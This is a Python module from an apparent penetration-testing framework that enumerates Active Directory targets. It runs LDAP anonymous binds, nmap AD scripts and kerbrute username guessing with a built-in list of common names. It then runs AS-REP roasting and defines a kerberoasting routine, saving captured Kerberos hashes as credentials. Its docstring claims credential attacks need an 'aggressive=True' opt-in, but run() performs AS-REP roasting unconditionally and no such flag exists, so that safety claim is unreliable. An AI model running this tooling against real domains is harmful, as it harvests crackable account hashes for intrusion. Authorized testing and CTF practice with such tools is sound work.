#!/usr/bin/env python3
"""
ClawSec Phase 2 — Active Directory Enumeration
Vertex Coders LLC

For Windows targets with LDAP (389/636) and/or Kerberos (88).
Designed to follow smb_enum (which gives us the domain name).

Tools used:
  - nmap NSE (ldap-search, ldap-rootdse, krb5-enum-users)
  - ldapsearch (anonymous bind)
  - kerbrute (userenum if userlist available)
  - impacket GetUserSPNs (kerberoasting if cred available)
  - impacket GetNPUsers (AS-REP roasting)
  - bloodhound-python (if cred available)

ALL operations here are passive enumeration only. No exploits, no DoS.
Active credential attacks (brute force, kerberoasting) require user opt-in
via 'aggressive=True'.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from phase2 import session as sess


def _which(*candidates: str) -> str | None:
    for c in candidates:
        path = shutil.which(c)
        if path:
            return path
    return None


def _run(cmd: list[str], timeout: int = 90) -> tuple[int, str]:
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors="replace")
        return out.returncode, (out.stdout + out.stderr)
    except subprocess.TimeoutExpired:
        return -1, f"[timeout after {timeout}s]"
    except FileNotFoundError:
        return -2, f"[binary not found: {cmd[0]}]"
    except Exception as e:
        return -3, f"[error: {e}]"


def _save_raw(target: str, name: str, content: str) -> Path:
    out_dir = Path(os.path.expanduser(f"~/.clawsec/sessions/{target}/ad"))
    out_dir.mkdir(parents=True, exist_ok=True)
    fp = out_dir / f"{name}.txt"
    fp.write_text(content)
    return fp


# ── Probes ────────────────────────────────────────────────────────────────────

def probe_ldap_anonymous(target: str) -> dict:
    """ldapsearch anónimo — extrae naming context y configuración de DNS/dominio."""
    ld = _which("ldapsearch")
    if not ld:
        return {"status": "skipped", "msg": "ldapsearch not installed"}

    # 1. RootDSE (no requiere bind)
    code, out = _run([
        ld, "-x", "-H", f"ldap://{target}", "-s", "base",
        "-b", "", "namingContexts", "defaultNamingContext", "domainFunctionality"
    ], timeout=20)
    _save_raw(target, "ldap_rootdse", out)

    domain = None
    naming_contexts: list[str] = []
    for line in out.splitlines():
        m = re.match(r"^namingContexts:\s*(\S+)", line)
        if m:
            naming_contexts.append(m.group(1))
        m = re.match(r"^defaultNamingContext:\s*(\S+)", line)
        if m:
            ctx = m.group(1)
            # DC=corp,DC=local → corp.local
            domain = ".".join([p.split("=")[1] for p in ctx.split(",") if "=" in p])

    # 2. Si tenemos dominio, intentar dump anónimo
    users: list[str] = []
    if domain and naming_contexts:
        code2, out2 = _run([
            ld, "-x", "-H", f"ldap://{target}",
            "-b", naming_contexts[0],
            "(objectClass=user)", "sAMAccountName"
        ], timeout=30)
        _save_raw(target, "ldap_users_anon", out2)
        for line in out2.splitlines():
            m = re.match(r"^sAMAccountName:\s*(\S+)", line)
            if m:
                users.append(m.group(1))

    return {
        "status":            "ok" if code == 0 else "blocked",
        "domain":            domain,
        "naming_contexts":   naming_contexts,
        "users_anon":        users,
        "anonymous_allowed": bool(naming_contexts),
        "raw_path":          "ad/ldap_rootdse.txt",
    }


def probe_nmap_ad(target: str) -> dict:
    """nmap NSE: ldap-rootdse, ldap-search, krb5-enum-users (sin lista, solo banner)."""
    nmap = _which("nmap")
    if not nmap:
        return {"status": "error", "msg": "nmap not installed"}

    scripts = "ldap-rootdse,ldap-search,krb5-enum-users"
    code, out = _run([
        nmap, "-Pn", "-p", "88,389,636,3268",
        "--script", scripts, target
    ], timeout=180)
    _save_raw(target, "nmap_ad_scripts", out)

    domain = None
    for line in out.splitlines():
        m = re.search(r"Domain:\s*([A-Za-z0-9.\-]+\.[a-z]+)", line)
        if m:
            domain = m.group(1).lower()

    return {"status": "ok", "domain": domain, "raw_path": "ad/nmap_ad_scripts.txt"}


def probe_kerbrute_userenum(target: str, domain: str | None, userlist_path: str | None = None) -> dict:
    """kerbrute userenum — pasivo (no rompe accounts)."""
    kb = _which("kerbrute")
    if not kb:
        return {"status": "skipped", "msg": "kerbrute not installed"}
    if not domain:
        return {"status": "skipped", "msg": "no domain known yet"}

    # Si no nos pasaron lista, usamos una mini-lista de usernames comunes en HTB/CTF.
    if not userlist_path or not Path(userlist_path).exists():
        common_users = [
            "administrator", "admin", "guest", "krbtgt",
            "svc_sql", "svc_web", "svc_backup", "svc_admin", "svc_iis",
            "ldap_admin", "backup", "sysadmin", "helpdesk",
            "test", "user", "user1", "operator",
            "j.smith", "jsmith", "jdoe", "j.doe",
        ]
        ul = Path(os.path.expanduser(f"~/.clawsec/sessions/{target}/ad/quick_userlist.txt"))
        ul.parent.mkdir(parents=True, exist_ok=True)
        ul.write_text("\n".join(common_users))
        userlist_path = str(ul)

    code, out = _run([
        kb, "userenum", "-d", domain, "--dc", target, userlist_path
    ], timeout=120)
    _save_raw(target, "kerbrute_userenum", out)

    valid_users: list[str] = []
    asrep_targets: list[str] = []
    for line in out.splitlines():
        m = re.search(r"VALID USERNAME:\s+(\S+)", line)
        if m:
            valid_users.append(m.group(1).split("@")[0])
        m = re.search(r"\[\+\]\s+(\S+@\S+)\s+has no pre auth required", line)
        if m:
            asrep_targets.append(m.group(1).split("@")[0])

    return {
        "status":         "ok" if code == 0 else "partial",
        "valid_users":    list(set(valid_users)),
        "asrep_targets":  list(set(asrep_targets)),
        "raw_path":       "ad/kerbrute_userenum.txt",
    }


def probe_asreproast(target: str, domain: str | None, users: list[str]) -> dict:
    """impacket-GetNPUsers — solo si tenemos lista de usuarios."""
    gnp = _which("impacket-GetNPUsers", "GetNPUsers.py")
    if not gnp:
        return {"status": "skipped", "msg": "impacket-scripts not installed"}
    if not domain or not users:
        return {"status": "skipped", "msg": "need domain + at least one user"}

    # Crear users file
    uf = Path(os.path.expanduser(f"~/.clawsec/sessions/{target}/ad/asrep_userlist.txt"))
    uf.parent.mkdir(parents=True, exist_ok=True)
    uf.write_text("\n".join(users))

    code, out = _run([
        gnp, "-no-pass", "-usersfile", str(uf),
        "-dc-ip", target, f"{domain}/"
    ], timeout=90)
    _save_raw(target, "asreproast", out)

    hashes = []
    for line in out.splitlines():
        if line.startswith("$krb5asrep$"):
            hashes.append(line.strip())

    return {
        "status":   "ok" if code == 0 else "partial",
        "hashes":   hashes,
        "found":    len(hashes),
        "raw_path": "ad/asreproast.txt",
    }


def probe_kerberoast(target: str, domain: str | None, user: str | None,
                     password: str | None) -> dict:
    """impacket-GetUserSPNs — requires authenticated user."""
    gus = _which("impacket-GetUserSPNs", "GetUserSPNs.py")
    if not gus:
        return {"status": "skipped", "msg": "impacket-scripts not installed"}
    if not (domain and user and password):
        return {"status": "skipped", "msg": "need domain/user/password"}

    code, out = _run([
        gus, "-request", "-dc-ip", target,
        f"{domain}/{user}:{password}"
    ], timeout=120)
    _save_raw(target, "kerberoast", out)

    hashes = [l.strip() for l in out.splitlines() if l.startswith("$krb5tgs$")]
    return {
        "status":   "ok" if code == 0 else "partial",
        "hashes":   hashes,
        "found":    len(hashes),
        "raw_path": "ad/kerberoast.txt",
    }


# ── Orquestador ───────────────────────────────────────────────────────────────

def run(target: str, ports: list[dict] | None = None) -> dict:
    print(f"[ad_enum] Starting AD enumeration for {target}")

    results = {
        "module":  "ad_enum",
        "target":  target,
        "probes":  {},
    }

    # 1. nmap AD scripts (banner-grab dominio)
    print(f"[ad_enum] (1/4) nmap AD scripts...")
    results["probes"]["nmap_ad"] = probe_nmap_ad(target)

    # 2. ldapsearch anónimo
    print(f"[ad_enum] (2/4) LDAP anonymous bind...")
    results["probes"]["ldap"] = probe_ldap_anonymous(target)

    # Determinar dominio
    domain = (results["probes"]["ldap"].get("domain")
              or results["probes"]["nmap_ad"].get("domain"))

    # Si phase 1 / smb_enum dejó users en sesión, también combinar
    s = sess.load(target)
    known_users = list(set(
        s["phase2"].get("users", []) +
        results["probes"]["ldap"].get("users_anon", [])
    ))

    # 3. kerbrute userenum (pasivo, no auth)
    print(f"[ad_enum] (3/4) kerbrute userenum (domain={domain or '?'})...")
    results["probes"]["kerbrute"] = probe_kerbrute_userenum(target, domain)

    # Combinar todos los users descubiertos
    all_users = list(set(
        known_users +
        results["probes"]["kerbrute"].get("valid_users", [])
    ))

    # 4. ASREProast (solo si tenemos users)
    print(f"[ad_enum] (4/4) AS-REP roasting against {len(all_users)} known users...")
    results["probes"]["asreproast"] = probe_asreproast(target, domain, all_users)

    # ── Update session ────────────────────────────────────────────────────────
    sess.add_enum_run(target, "ad_enum", "completed", results)

    if all_users:
        sess.add_users(target, all_users)

    # Guardar dominio en notes
    if domain:
        s = sess.load(target)
        s["phase2"]["domain"] = domain
        sess.save(target, s)

    # Guardar hashes ASREP como pseudo-credentials
    for h in results["probes"]["asreproast"].get("hashes", []):
        # Format: $krb5asrep$23$user@DOMAIN:hash...
        m = re.match(r"\$krb5asrep\$23\$([^@]+)@", h)
        user = m.group(1) if m else "unknown"
        sess.add_credential(target, user, h, "ad_enum/asreproast", "kerberos-asrep")

    # Resumen
    summary = {
        "domain":          domain,
        "users_total":     len(all_users),
        "asrep_hashes":    results["probes"]["asreproast"].get("found", 0),
        "anon_ldap":       results["probes"]["ldap"].get("anonymous_allowed", False),
    }
    results["summary"] = summary

    print(f"[ad_enum] ✅ Done. Domain: {domain or '?'} | "
          f"Users: {len(all_users)} | ASREP hashes: {summary['asrep_hashes']}")
    return results


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("target")
    args = p.parse_args()
    out = run(args.target)
    import json as _j
    print(_j.dumps(out["summary"], indent=2))
